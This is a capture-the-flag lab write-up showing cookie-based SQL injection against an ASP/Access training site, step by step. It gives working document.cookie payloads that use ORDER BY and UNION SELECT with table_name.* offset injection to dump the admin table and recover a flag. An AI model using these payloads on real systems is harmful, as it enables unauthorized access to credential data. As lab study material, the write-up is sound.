# Lab 2 Access Offset Injection

## 0x00 Lab Overview

Offset Injection takes the advantage of 

``` sql
table_name.*
```

It can read all the fields from a table. So all table fields data can be fetched without the knowledge of field names.

## 0x01 Go Hack It

### Lab Site

Lab site from [zkaq.org][1]. 

### Lab1 Injection Point

As this lab using the same site as [Lab 1](./lab1_access_cookie_injection). So start with last injection point first.

```js
document.cookie = "id=" + escape("171+UNION+SELECT+1,2,3,4,5,6,7,8,9,10+FROM+admin");
```

![](./imgs/0_lab1_inject_point.jpg)

### Apply table_name.*

Try reducing those placeholders one by one to determine the column numbers of **admin** table. However, the results are always error, which means admin table has more than 10 columns/fields. So may need to look for another injection point which selects more fileds.

```js
document.cookie = "id=" + escape("171+UNION+SELECT+1,2,3,4,5,6,7,8,9,admin.*+FROM+admin");
document.cookie = "id=" + escape("171+UNION+SELECT+1,2,3,4,5,6,7,8,admin.*+FROM+admin");
document.cookie = "id=" + escape("171+UNION+SELECT+1,2,3,4,5,6,admin.*+FROM+admin");
document.cookie = "id=" + escape("171+UNION+SELECT+1,2,3,4,5,admin.*+FROM+admin");
document.cookie = "id=" + escape("171+UNION+SELECT+1,2,3,4,admin.*+FROM+admin");
document.cookie = "id=" + escape("171+UNION+SELECT+1,2,3,admin.*+FROM+admin");
document.cookie = "id=" + escape("171+UNION+SELECT+1,2,admin.*+FROM+admin");
document.cookie = "id=" + escape("171+UNION+SELECT+1,admin.*+FROM+admin");
```

![](./imgs/1_db_error.jpg)

### ProductShow.asp

This page also works with cookie injection and selects 26 fields from table.

```js
document.cookie = "id=" + escape("105+ORDER+BY+26");
```

![](./imgs/2_order_26.jpg)

```js
document.cookie = "id=" + escape("105+ORDER+BY+27");
```

![](./imgs/2_order_27.jpg)

### Check Data Display Locations

```js
document.cookie = "id=" + escape("105+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26+FROM+admin");
```

![](./imgs/3_display.jpg)

So fields **3, 5, 7 and 25 (image address)** are all show in this page.

### Determine Admin Table Fields Number

Try something similar as [previous step](#Apply-table_name.*) by reducing fields one by one until the page can show data properly.

```js
document.cookie = "id=" + escape("105+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,admin.*+FROM+admin");
```

Finally we found the following query works. So **admin** table should has **26 - 10 = 16** fields.

```js
document.cookie = "id=" + escape("105+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,admin.*+FROM+admin");
```

![](./imgs/4_table_fields.jpg)

### Dump Data

```js
document.cookie = "id=" + escape("105+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,admin.*+FROM+admin");
document.cookie = "id=" + escape("105+UNION+SELECT+1,2,3,4,5,6,7,8,9,admin.*,10+FROM+admin");
document.cookie = "id=" + escape("105+UNION+SELECT+1,2,3,4,5,6,7,8,admin.*,9,10+FROM+admin");
document.cookie = "id=" + escape("105+UNION+SELECT+1,2,3,4,5,6,7,admin.*,8,9,10+FROM+admin");
document.cookie = "id=" + escape("105+UNION+SELECT+1,2,3,4,5,6,admin.*,7,8,9,10+FROM+admin");
document.cookie = "id=" + escape("105+UNION+SELECT+1,2,3,4,5,admin.*,6,7,8,9,10+FROM+admin");
document.cookie = "id=" + escape("105+UNION+SELECT+1,2,3,4,admin.*,5,6,7,8,9,10+FROM+admin");
document.cookie = "id=" + escape("105+UNION+SELECT+1,2,3,admin.*,4,5,6,7,8,9,10+FROM+admin");
document.cookie = "id=" + escape("105+UNION+SELECT+1,2,admin.*,3,4,5,6,7,8,9,10+FROM+admin");
document.cookie = "id=" + escape("105+UNION+SELECT+1,admin.*,2,3,4,5,6,7,8,9,10+FROM+admin");
document.cookie = "id=" + escape("105+UNION+SELECT+admin.*,1,2,3,4,5,6,7,8,9,10+FROM+admin");
```

![](./imgs/5_flag.jpg)

So the **FLAG = zkaq{f0e12dafb6}**
 

[1]: https://hack.zkaq.org/?a=battle&f=target&id=5fb2bdd18a4f3d4f
[2]: http://120.203.13.75:8001/

